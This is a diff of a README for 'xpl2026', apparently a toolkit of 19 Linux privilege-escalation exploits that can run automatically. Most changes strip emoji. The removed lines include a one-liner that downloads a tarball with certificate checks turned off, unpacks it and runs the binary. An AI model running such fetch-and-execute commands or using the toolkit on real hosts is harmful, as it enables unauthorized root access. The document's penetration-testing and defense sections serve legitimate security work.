@@ -5,7 +5,7 @@
 
 ---
 
-## 📋 Table of Contents
+## Table of Contents
 
 - [Overview](#overview)
 - [Features](#features)
@@ -18,10 +18,11 @@
 - [Advanced Usage](#advanced-usage)
 - [Detection & Defense](#detection--defense)
 - [Legal Notice](#legal-notice)
+- [Quick Reference](#quick-reference)
 
 ---
 
-## 🎯 Overview
+## Overview
 
 The **xpl2026** toolkit is a comprehensive collection of 19 Linux Local Privilege Escalation (LPE) exploits, designed for penetration testing and security research. All exploits are compiled as **fully static binaries** for maximum portability and compatibility across different Linux distributions.
 
@@ -35,28 +36,28 @@ The **xpl2026** toolkit is a comprehensive collection of 19 Linux Local Privileg
 
 ---
 
-## ✨ Features
+## Features
 
 ### Universal Compatibility
-- ✅ **Fully Static Binaries** - No missing library issues
-- ✅ **Multi-Distribution** - Works on RHEL, Debian, Ubuntu, CentOS, Fedora, etc.
-- ✅ **Multi-Kernel** - Covers kernel versions from 2.6.x to 7.1.x
-- ✅ **LSM-Aware** - Detects and adapts to SELinux, AppArmor
+- **Fully Static Binaries** - No missing library issues
+- **Multi-Distribution** - Works on RHEL, Debian, Ubuntu, CentOS, Fedora, etc.
+- **Multi-Kernel** - Covers kernel versions from 2.6.x to 7.1.x
+- **LSM-Aware** - Detects and adapts to SELinux, AppArmor
 
 ### Intelligent Analysis
-- 🔍 **Automatic Detection** - Identifies viable exploits for your system
-- 🔍 **Requirement Checking** - Validates prerequisites before execution
-- 🔍 **Smart Filtering** - Shows only applicable exploits
+- **Automatic Detection** - Identifies viable exploits for your system
+- **Requirement Checking** - Validates prerequisites before execution
+- **Smart Filtering** - Shows only applicable exploits
 
 ### User-Friendly Interface
-- 🎨 **Color-Coded Output** - Easy-to-read status indicators
-- 🎨 **Interactive Menu** - Simple selection interface
-- 🎨 **Auto-Exploitation** - Run all viable exploits automatically
-- 🎨 **Detailed Information** - View exploit details and requirements
+- **Color-Coded Output** - Easy-to-read status indicators
+- **Interactive Menu** - Simple selection interface
+- **Auto-Exploitation** - Run all viable exploits automatically
+- **Detailed Information** - View exploit details and requirements
 
 ---
 
-## 📦 Toolkit Contents
+## Toolkit Contents
 
 ### Complete Exploit List
 
@@ -101,14 +102,11 @@ xpl2026/
 
 ---
 
-## 🚀 Quick Start
+## Quick Start
 
 ### Basic Usage
 
 ```bash
-# Download directly
-wget https://github.com/khadafigans/LPE-Toolkit/raw/refs/heads/main/xpl2026.tgz
-
 # Navigate to xpl2026 directory
 cd /path/to/xpl2026
 
@@ -116,11 +114,6 @@ cd /path/to/xpl2026
 ./xpl2026
 ```
 
-### One Liner
-```bash
-wget https://github.com/khadafigans/LPE-Toolkit/raw/refs/heads/main/xpl2026.tgz --no-check-certificate && tar xzf xpl2026.tgz && rm -rf xpl2026.tgz && cd xpl2026 && chmod +x xpl2026 && ./xpl2026
-```
----
 ### Auto-Exploitation (Recommended)
 
 The toolkit will:
@@ -150,7 +143,7 @@ Your choice: 99   # Shows detailed info about all exploits
 
 ---
 
-## 📖 Exploit Details
+## Exploit Details
 
 ### 1. CopyFail (CVE-2026-31431)
 
@@ -303,10 +296,10 @@ Your choice: 99   # Shows detailed info about all exploits
 - Requires kernel >= 5.18 (act_pedit support)
 
 **Verified Targets:**
-- ✅ RHEL 10.0 (kernel 6.12.0)
-- ✅ Debian 13 (kernel 6.12.90)
-- ✅ Ubuntu 24.04 (kernel 6.17.0) with `--ubuntu` flag
-- ❌ Ubuntu 26.04 (AppArmor bypass closed)
+- RHEL 10.0 (kernel 6.12.0)
+- Debian 13 (kernel 6.12.90)
+- Ubuntu 24.04 (kernel 6.17.0) with `--ubuntu` flag
+- Ubuntu 26.04 (AppArmor bypass closed) - NOT supported
 
 ---
 
@@ -468,7 +461,7 @@ ls -la /usr/bin/pkexec
 
 ---
 
-## 💡 Usage Examples
+## Usage Examples
 
 ### Example 1: Basic Scan
 
@@ -553,7 +546,7 @@ uid=0(root) gid=0(root) groups=0(root)
 
 ---
 
-## 🖥️ System Requirements
+## System Requirements
 
 ### Minimum Requirements
 - **Architecture:** x86_64 (64-bit Intel/AMD)
@@ -568,14 +561,14 @@ uid=0(root) gid=0(root) groups=0(root)
 
 ### Compatibility
 
-✅ **Works On:**
+**Works On:**
 - Standard Linux distributions
 - VPS (DigitalOcean, Linode, Vultr, OVH, Hetzner)
 - Dedicated servers
 - Physical machines
 - Non-cloud VMs (VirtualBox, VMware, KVM)
 
-❌ **Limited/No Support:**
+**Limited/No Support:**
 - Microsoft Azure (kernel hardening)
 - Google Cloud Platform (some restrictions)
 - AWS EC2 (some restrictions)
@@ -583,7 +576,7 @@ uid=0(root) gid=0(root) groups=0(root)
 
 ---
 
-## 🔧 Troubleshooting
+## Troubleshooting
 
 ### Issue: No Viable Exploits Found
 
@@ -697,7 +690,7 @@ cd /dev/shm
 
 ---
 
-## 🔬 Advanced Usage
+## Advanced Usage
 
 ### Batch Testing
 
@@ -772,7 +765,7 @@ fi
 
 ---
 
-## 🛡️ Detection & Defense
+## Detection & Defense
 
 ### Detection Methods
 
@@ -848,19 +841,19 @@ sysctl -w kernel.unprivileged_bpf_disabled=1
 
 ---
 
-## ⚖️ Legal Notice
+## Legal Notice
 
 ### Authorized Use Only
 
 This toolkit is provided for:
-- ✅ **Authorized penetration testing**
-- ✅ **Security research in controlled environments**
-- ✅ **CVE verification and testing**
-- ✅ **Educational purposes**
+- **Authorized penetration testing**
+- **Security research in controlled environments**
+- **CVE verification and testing**
+- **Educational purposes**
 
 ### Prohibited Use
 
-❌ **DO NOT use this toolkit for:**
+**DO NOT use this toolkit for:**
 - Unauthorized access to systems
 - Malicious purposes
 - Attacking systems without explicit permission
@@ -885,7 +878,9 @@ SOFTWARE.
 - Allow reasonable time for patching (typically 90 days)
 - Respect coordinated disclosure timelines
 
-## 📊 Quick Reference
+---
+
+## Quick Reference
 
 ### Exploit Selection Guide
 
